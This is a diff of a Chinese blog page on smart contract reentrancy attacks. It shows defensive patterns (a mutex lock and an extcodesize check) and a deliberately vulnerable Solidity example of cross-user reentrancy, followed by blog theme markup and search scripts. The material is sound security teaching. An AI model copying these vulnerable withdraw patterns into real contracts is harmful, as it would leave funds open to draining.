 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool reEntrancecyMutex = false;</span><br><span class="line">function withdraw(uint256 amount) public&#123;</span><br><span class="line">    require(!reEntrancecyMutex);</span><br><span class="line">    reEntrancecyMutex = true;//上锁</span><br><span class="line">    require(balances[msg.sender] &gt;= amount);</span><br><span class="line">    require(this.balance &gt;= amount);</span><br><span class="line">    if(msg.sender.call.value(amout)())&#123;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    reEntrancecyMutex = false;//解锁</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>禁止转账 Ether 到合约地址：因为合约可以通过回调函数来进行重入，禁止转账到合约地址，可以防止转账导致的合约重入。这里使用到了内联汇编</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function withdraw() nonReentrant external &#123;</span><br><span class="line">    require(balance[msg.sender] &gt; 0, &quot;Bank: no balance&quot;);</span><br><span class="line">    uint256 size;</span><br><span class="line">    address sender = msg.sender;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        size := extcodesize(sender)//extcodesize(sender):地址sender的代码大小</span><br><span class="line">    &#125;</span><br><span class="line">    //需要地址代码大小为0，说明地址肯定就不是合约，只能是用户</span><br><span class="line">    require(size == 0, &quot;Bank: cannot transfer to contract&quot;);</span><br><span class="line">    msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">    totalDeposit -= balance[msg.sender];</span><br><span class="line">    balance[msg.sender] = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>使用代码审计工具：<a target="_blank" rel="noopener" href="https://github.com/wangbar0133/Asuka%E3%80%82">https://github.com/wangbar0133/Asuka。</a></li>
+<li>使用代码审计工具：<a target="_blank" rel="noopener" href="https://github.com/wangbar0133/Asuka。">https://github.com/wangbar0133/Asuka。</a></li>
 </ul>
 <p>这是使用纯python编写的solidity代码审计工具，不需要安装solc等其他环境，可一键安装。如图是BEC整数溢出漏洞检测出来的结果</p>
-<p><img src="https://moe.photo/images/2023/02/22/6e0dcdb33de208d048ec4c73541c4ca8.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/6e0dcdb33de208d048ec4c73541c4ca8.png" alt></p>
 <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>跨用户重入</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mapping(address=&gt;uint) private userBalances;</span><br><span class="line"></span><br><span class="line">function transfer(address to,uint amount)&#123;</span><br><span class="line">	if(userBalances[msg.sender] &gt;= amount)&#123;</span><br><span class="line">		userBalances[to] += amount;</span><br><span class="line">		userBalances[msg.sender] -= amount;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawBalance() public&#123;</span><br><span class="line">	uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">	(bool success,_) = msg.sender.call.value(amountToWithdraw);</span><br><span class="line">	require(success);</span><br><span class="line">	userBalances[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>合约在收到eth的时候会触发receive或者fallback方法。用户调用withdraw提取之后，触发了这个方法，但是存储代币的那个目标合约里的userbalance此时还没归0，触发的receive或者fallback又调用了transfer方法向别的人进行转账。即：fallback或者receive中包含了withdraw和transfer方法</p>
 <p>这会导致，黑客A重入，然后黑客A又把权益给了黑客B，黑客B拥有黑客A在合约中的钱。这时黑客B又可以进行重入……</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">LEVI_104</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/">http://example.com/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">solidity life</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s1.vika.cn/space/2022/11/28/fe281a55d40a494a81c5b33f7f592aca" target="_blank"><img class="post-qr-code-img" src="https://s1.vika.cn/space/2022/11/28/fe281a55d40a494a81c5b33f7f592aca" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://s1.vika.cn/space/2022/11/28/facf145842a64b25ba613a98f6f65a7e" target="_blank"><img class="post-qr-code-img" src="https://s1.vika.cn/space/2022/11/28/facf145842a64b25ba613a98f6f65a7e" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/02.stake%E6%BC%8F%E6%B4%9E/02.stake%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">02.stake漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">04.模糊身份漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.vika.cn/space/2022/11/27/638555bfd98049caacc20724b56b4fb6" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LEVI_104</div><div class="author-info__description">始生有物，其形必丑</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">292</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">39</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chen4903"><i class="fab fa-github"></i><span>关注</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8" target="_blank" title="Twitter"><i class="fa-brands fa-twitter"></i></a><a class="social-icon" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0" target="_blank" title="WeChat"><i class="fa-brands fa-weixin"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">重入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%94%9F%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">发生重入攻击的条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fallback%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">Fallback回调函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E4%BA%A4%E6%98%93"><span class="toc-number">1.3.2.</span> <span class="toc-text">发送交易</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">例子复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remix%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">Remix复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A1%88%E4%BE%8B"><span class="toc-number">1.6.</span> <span class="toc-text">相关案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.7.</span> <span class="toc-text">如何防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.8.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/25/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/08.Puppet/" title="08.Puppet"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="08.Puppet"/></a><div class="content"><a class="title" href="/2023/02/25/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/08.Puppet/" title="08.Puppet">08.Puppet</a><time datetime="2023-02-25T08:55:42.290Z" title="发表于 2023-02-25 16:55:42">2023-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/24/38.chainflag%20CTF/00.digest/" title="00.digest"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="00.digest"/></a><div class="content"><a class="title" href="/2023/02/24/38.chainflag%20CTF/00.digest/" title="00.digest">00.digest</a><time datetime="2023-02-24T13:09:53.109Z" title="发表于 2023-02-24 21:09:53">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/24/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/07.Compromised/" title="07.Compromised"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="07.Compromised"/></a><div class="content"><a class="title" href="/2023/02/24/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/07.Compromised/" title="07.Compromised">07.Compromised</a><time datetime="2023-02-24T12:24:39.774Z" title="发表于 2023-02-24 20:24:39">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/24/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/06.Selfie/" title="06.Selfie"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="06.Selfie"/></a><div class="content"><a class="title" href="/2023/02/24/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/06.Selfie/" title="06.Selfie">06.Selfie</a><time datetime="2023-02-24T04:08:03.757Z" title="发表于 2023-02-24 12:08:03">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/23/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/05.The%20Rewarder/" title="05.The Rewarder"><img src="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="05.The Rewarder"/></a><div class="content"><a class="title" href="/2023/02/23/35.Damn%20Vulnerable%20DeFi%20v2%20CTF/05.The%20Rewarder/" title="05.The Rewarder">05.The Rewarder</a><time datetime="2023-02-23T11:51:26.671Z" title="发表于 2023-02-23 19:51:26">2023-02-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By LEVI_104</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-28 08:30:08
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/" title="09.安全审计">
+                        <b>#</b> 09.安全审计
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/02.stake%E6%BC%8F%E6%B4%9E/02.stake%E6%BC%8F%E6%B4%9E/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">重入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%94%9F%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">发生重入攻击的条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fallback%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-text">Fallback回调函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E4%BA%A4%E6%98%93"><span class="toc-text">发送交易</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E5%A4%8D%E7%8E%B0"><span class="toc-text">例子复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remix%E5%A4%8D%E7%8E%B0"><span class="toc-text">Remix复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A1%88%E4%BE%8B"><span class="toc-text">相关案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-text">如何防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F11%2F28%2F09.%25E5%25AE%2589%25E5%2585%25A8%25E5%25AE%25A1%25E8%25AE%25A1%2F01.%25E9%2587%258D%25E5%2585%25A5%25E6%2594%25BB%25E5%2587%25BB_1%2F01.%25E9%2587%258D%25E5%2585%25A5%25E6%2594%25BB%25E5%2587%25BB_1%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
